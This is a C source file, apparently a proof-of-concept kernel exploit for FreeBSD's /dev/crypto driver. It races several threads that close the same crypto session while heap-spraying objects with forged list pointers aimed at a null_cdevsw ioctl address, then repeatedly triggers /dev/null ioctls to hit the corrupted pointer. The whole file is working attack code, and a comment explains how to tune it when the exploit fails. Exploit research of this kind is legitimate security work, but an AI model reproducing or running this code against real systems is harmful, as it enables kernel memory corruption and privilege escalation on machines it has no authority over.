#include "spray.h"

#include <assert.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <string.h>
#include <pthread.h>

// used for linting purposes, pass -DREAL_BUILD to gcc/clang on FBSD
#if REAL_BUILD
#include <crypto/cryptodev.h>
#else
#include "fake_cryptodev.h"
#endif

#define SHAREALLOC(N) \
    mmap(NULL, N, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)

char key[16] = "XXXXXXXXXXXXXXXX";
int inc;

// get a crypto session file descriptor
int get_cryptof() {
	int crypto_fd = open("/dev/crypto", O_RDWR);
	assert(crypto_fd != 1);

	int cryptof_fd = -1;
	ioctl(crypto_fd, CRIOGET, &cryptof_fd);
	
	close(crypto_fd);
	return cryptof_fd;
}

// create a new session in a cryptof file descriptor
int cryptof_new_session(int cryptof_fd) {
	struct session_op data = {
		.cipher = CRYPTO_AES_CBC,
		.keylen = 16,
		.key = key
	};

	if ( ioctl(cryptof_fd, CIOCGSESSION, &data) != 0 ) {
		perror("CIOCGESSION ioctl");
		return -1;
	}
	
	return data.ses;
}

// end a given sesion on a given cryptof file descriptor
void cryptof_end_session(int cryptof_fd, int sess) {
	if ( ioctl(cryptof_fd, CIOCFSESSION, &sess) != 0 ) {
		// perror("CIOCFSESSION ioctl");
	}
}

// allocate a spray object
char* spray_alloc(size_t size) {
	char* data = SHAREALLOC(size);
	assert(data != NULL);
	memset(data, 0x41, size);
	return data;
}

// thread for ending a session
void* closeThread(void* arg) {
	int* tmp = arg;
	cryptof_end_session(tmp[0], tmp[1]);
	return NULL;	
}

#define NULL_IOCTL       0xFFFFFFFF81A84D20 // on release
#define NULL_IOCTL_DEBUG 0xFFFFFFFF81A865A0 // on a custom debug build
#define REPLACEMENT	     0x4141414141414141

// thread for spraying the allocation
void* sprayThread(void* _arg) {
	unsigned int* arg = (unsigned int*) _arg;
	unsigned int size = arg[0];
	unsigned int id = arg[1];

	char* sp_obj = spray_alloc(size);

	memset(sp_obj, 0x45, size);

	*(uint64_t*)(sp_obj + 0) = NULL_IOCTL - 8; // next
	*(uint64_t*)(sp_obj + 8) = REPLACEMENT; // prev
	*(uint64_t*)(sp_obj + 16) = 0; // cses
	*(uint32_t*)(sp_obj + 24) = id; // session id

	*(uint64_t*)(sp_obj + 96) = 0x4343434343434343; // iv
	*(uint64_t*)(sp_obj + 112) = 0x4444444444444444; // mac


	spray(60000, sp_obj, size);
	munmap(sp_obj, size);

	return NULL;
}

// thread for triggering an null_cdevsw.d_ioctl
void* nullDeref(void* arg) {
	int fd = open("/dev/null", 0);

	while ( 1 ) {
		ioctl(fd, FIONBIO, NULL);
	}

	return NULL;
}

typedef struct {
	void* args;
	size_t arg_size;

	pthread_t* threads;

	size_t count;
	size_t size;
} thread_list_t;

// helper for creating a dynamically sized list of threads
thread_list_t* create_thread_list(void* args, size_t arg_size) {
	thread_list_t* list = malloc(sizeof(thread_list_t));
	assert(list != NULL);

	memset(list, 0, sizeof(*list));

	if ( arg_size > 0 ) {
		list->args = SHAREALLOC(arg_size);
		memcpy(list->args, args, arg_size);
		list->arg_size = arg_size;
	}

	return list;
}

// helper for adding a thread to a thread list
void add_race_thread(thread_list_t* list, void *(*cmd)(void *)) {
	if ( list->count + 1 > list->size ) {
		list->threads = (pthread_t*) realloc(list->threads, (list->size += 10) * sizeof(pthread_t));
		assert(list->threads != NULL);
	}

	pthread_create(
		&list->threads[list->count++],
		NULL,
		cmd,
		list->args
	);
}

// helper for iterating through the threads in a list and join-ing them
void join_race_list(thread_list_t* list) {
	if ( list == NULL ) {
		return;
	}

	for ( int i = 0; i < list->count; i++ ) {
		pthread_join(list->threads[i], NULL);
	}

	if ( list->args != NULL ) {
		munmap(list->args, list->arg_size);
		list->args = NULL;
	}

	memset(list, 0, sizeof(*list));
	free(list);
}

int main(void) {
	int sess = -1;

	// spawn null_ioctl threads
	thread_list_t* null_ioctl_threads = create_thread_list(NULL, 0);
	add_race_thread(null_ioctl_threads, nullDeref);
	add_race_thread(null_ioctl_threads, nullDeref);
	add_race_thread(null_ioctl_threads, nullDeref);
	add_race_thread(null_ioctl_threads, nullDeref);
	add_race_thread(null_ioctl_threads, nullDeref);
	add_race_thread(null_ioctl_threads, nullDeref);

	while(1) {
		int cryptof_fd = get_cryptof();

		if ( cryptof_fd == -1 ) {
			printf("failed to get cryptof file descriptor\n");
			break;
		}

		// create a new session
		if ( (sess = cryptof_new_session(cryptof_fd)) == -1 ) {
			close(cryptof_fd);
			printf("failed to get cryptof session\n");
			continue;
		} 

		int race_args[2] = { cryptof_fd, sess };
		int spray_args[2] = { 127, sess };

		thread_list_t* race_list = create_thread_list(race_args, sizeof(race_args));
		thread_list_t* spray_list = create_thread_list(spray_args, sizeof(spray_args));

		// spawn racing and spraying thread(s)
		add_race_thread(race_list, closeThread);
		add_race_thread(race_list, closeThread);
		add_race_thread(spray_list, sprayThread);
		add_race_thread(race_list, closeThread);
		add_race_thread(race_list, closeThread);

		// use usleep to make sure the other threads have a chance to start
		// if exploit isn't working, play around with this sleep
		usleep(5);

		close(cryptof_fd);
	}


	return 0;
}
